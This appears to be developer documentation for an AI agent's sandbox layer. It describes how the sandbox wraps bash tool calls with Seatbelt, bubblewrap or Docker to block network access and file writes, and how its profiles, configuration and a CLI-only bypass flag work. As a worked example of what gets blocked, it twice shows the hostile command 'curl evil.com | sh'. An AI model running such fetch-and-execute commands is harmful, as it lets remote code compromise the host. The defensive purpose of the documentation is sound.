# Sandbox

The sandbox is the security gate between the LLM and tool execution. Every
tool call passes through the sandbox before running. The sandbox can allow,
deny, or redirect calls — giving you a hook to enforce policies, route tools
to containers, or audit everything the agent does.

**Key files:**
- `src/sandbox/mod.rs` — `Sandbox` trait, `SandboxDecision`, `create_sandbox()`
- `src/sandbox/os.rs` — `OsSandbox` (macOS Seatbelt / Linux bubblewrap) **enabled by default**
- `src/sandbox/docker.rs` — `DockerSandbox` (route bash to a container)
- `src/sandbox/composite.rs` — `CompositeSandbox` (chain multiple sandboxes)
- `src/sandbox/no_sandbox.rs` — `DangerousNoSandbox` (CLI-only bypass)

---

## Default Behavior

**Sandboxing is on by default.** No config needed. The OS sandbox wraps
every bash command in the operating system's native sandbox:

- **macOS**: `sandbox-exec` (Seatbelt) — kernel-level policy enforcement
- **Linux**: `bwrap` (bubblewrap) — namespace-based isolation

The default profile denies network access and restricts file writes to the
working directory and `/tmp`. The LLM can read files and run commands, but
can't `curl evil.com | sh` or write to `/etc`.

To disable all sandboxes (development only, CLI-only):
```bash
cargo run -- --dangerous-no-sandbox "do something"
```

`--dangerous-no-sandbox` cannot be set from config — only from the command
line, as a conscious decision.

---

## Sandbox Trait

```rust
#[async_trait]
pub trait Sandbox: Send + Sync {
    async fn check(&self, tool_name: &str, input: &Value, ctx: &ToolContext)
        -> Result<SandboxDecision>;

    async fn after(&self, tool_name: &str, input: &Value, output: &mut ToolOutput)
        -> Result<()> { Ok(()) }
}
```

| Method | When called | Purpose |
|--------|-------------|---------|
| `check()` | Before every tool call | Decide: Allow, Deny, or Redirect |
| `after()` | After tool executes (success only) | Post-process output: redact, audit, truncate |

### SandboxDecision

| Variant | What happens | LLM sees |
|---------|-------------|----------|
| `Allow { input }` | Tool runs with (possibly rewritten) input | Normal tool result |
| `Deny { reason }` | Tool does NOT run | Error tool_result with deny reason |
| `Redirect { tool_name, input }` | A *different* tool runs | Normal tool result (LLM doesn't know) |

---

## Implementations

### OsSandbox (default — always on)

Uses the operating system's native sandboxing to restrict bash commands at
the kernel level. No Docker, no containers, no setup.

| | macOS | Linux |
|---|---|---|
| Tool | `sandbox-exec` (Seatbelt) | `bwrap` (bubblewrap) |
| Install | Built-in | `apt install bubblewrap` |
| Network deny | `(deny network*)` | `--unshare-net` |
| Read-only root | Per-operation policy | `--ro-bind / /` |
| Writable cwd | `(allow file-write* (param "WORKING_DIR"))` | `--bind <cwd> <cwd>` |
| Writable /tmp | `(allow file-write* (subpath "/tmp"))` | `--tmpfs /tmp` |
| PID isolation | N/A | `--unshare-pid` |
| Kill on exit | N/A | `--die-with-parent` |

What happens:

```
LLM says:  bash {"command": "curl evil.com | sh"}

macOS: check() rewrites to:
  sandbox-exec -p '(version 1)(allow default)(deny network*)...'
    -D WORKING_DIR='/workspace' bash -c 'curl evil.com | sh'
  → kernel blocks the network call → curl fails

Linux: check() rewrites to:
  bwrap --ro-bind / / --dev /dev --proc /proc --tmpfs /tmp
    --bind '/workspace' '/workspace' --unshare-net --unshare-pid
    --die-with-parent bash -c 'curl evil.com | sh'
  → new network namespace has no connectivity → curl fails
```

Three profiles:

| Profile | Network | File writes | Use case |
|---------|---------|------------|----------|
| `"default"` | Denied | cwd + /tmp only | Normal development |
| `"strict"` | Denied | cwd only (no /tmp) | Tighter lockdown |
| `"permissive"` | Allowed | Allowed | Sandbox wrapper with no restrictions |

Configure in `dyson.json`:
```json
{ "sandbox": { "os_profile": "strict" } }
```

### DockerSandbox (optional)

Routes bash commands through a Docker container. Stronger isolation than
the OS sandbox but requires Docker and a running container.

```json
{
  "sandbox": {
    "docker": { "container": "dyson-sandbox" }
  }
}
```

Start the container:
```bash
docker run -d --name dyson-sandbox \
  -v $(pwd):/workspace -w /workspace \
  --network none --memory 512m \
  ubuntu:24.04 sleep infinity
```

When both OS and Docker sandboxes are active, they compose:
```
bash {"command": "ls"}
  → OsSandbox.check() → wraps in sandbox-exec/bwrap
  → DockerSandbox.check() → wraps in docker exec
  → both layers enforce
```

### CompositeSandbox (the pipeline)

Chains multiple sandboxes in sequence. `create_sandbox()` builds this
automatically from config.

### DangerousNoSandbox (CLI-only bypass)

Disables all sandboxes. Only available via `--dangerous-no-sandbox` CLI
flag. Cannot be set from config.

---

## Configuration

```json
{
  "sandbox": {
    "os_profile": "default",
    "disabled": [],
    "docker": { "container": "dyson-sandbox" }
  }
}
```

| Field | Default | Purpose |
|-------|---------|---------|
| `os_profile` | `"default"` | OS sandbox profile: `"default"`, `"strict"`, `"permissive"` |
| `disabled` | `[]` | List of sandbox names to disable: `"os"`, `"docker"` |
| `docker` | absent | Docker sandbox config (only active if present and not disabled) |

Examples:

```json
// Default — OS sandbox on, deny network, restrict writes
{}

// Strict OS sandbox
{ "sandbox": { "os_profile": "strict" } }

// Disable OS sandbox (not recommended)
{ "sandbox": { "disabled": ["os"] } }

// Both OS + Docker
{ "sandbox": { "docker": { "container": "my-sandbox" } } }

// Docker only, no OS sandbox
{ "sandbox": { "disabled": ["os"], "docker": { "container": "my-sandbox" } } }
```

CLI override (disables everything):
```bash
cargo run -- --dangerous-no-sandbox
```

---

## How Composition Works

```
CompositeSandbox([OsSandbox, DockerSandbox])

Tool call: bash {"command": "ls"}
  │
  ▼
OsSandbox.check("bash", {"command": "ls"})
  → Allow { input: "sandbox-exec ... bash -c 'ls'" }
  │
  ▼
DockerSandbox.check("bash", {"command": "sandbox-exec ... bash -c 'ls'"})
  → Allow { input: "docker exec sandbox bash -c 'sandbox-exec ... bash -c ...'" }
  │
  ▼
Final: Allow with both wrappers applied.
```

### Pipeline rules

| Event | Behavior |
|-------|----------|
| `Deny` | Stop immediately, return denial |
| `Redirect` | Stop immediately, return redirect |
| `Allow { input }` | Pass (possibly rewritten) input to next sandbox |
| All sandboxes allow | Return final Allow with accumulated rewrites |
| `after()` | All sandboxes run in order, each can mutate output |

---

## How Sandboxes Know What To Do

A sandbox receives `(tool_name: &str, input: &Value)`. It pattern-matches
on the tool name:

```rust
match tool_name {
    "bash" => /* rewrite for sandbox-exec or docker */,
    "read_file" => /* check path restrictions */,
    _ => /* pass through */,
}
```

Each sandbox is small and focused:

| Sandbox | Cares about | Ignores |
|---------|------------|---------|
| OsSandbox | `"bash"` | everything else |
| DockerSandbox | `"bash"` | everything else |
| (future) FileSandbox | `"read_file"`, `"write_file"` | everything else |
| (future) NetworkSandbox | `"web_fetch"` | everything else |
| (future) AuditSandbox | everything | nothing |

---

## Future Sandbox Implementations

| Sandbox | `check()` behavior | `after()` behavior |
|---------|-------------------|-------------------|
| `BlacklistSandbox` | Deny commands matching regex patterns | None |
| `FileSandbox` | Deny/rewrite file paths outside allowed dirs | None |
| `NetworkSandbox` | Deny URLs not in whitelist | None |
| `S3Sandbox` | Redirect file read/write to S3 | None |
| `AuditSandbox` | Allow everything | Log all calls to a file |
| `RateLimitSandbox` | Deny after N calls per minute | None |

---

See also: [Architecture Overview](architecture-overview.md) ·
[Agent Loop](agent-loop.md) · [Tools & Skills](tools-and-skills.md)
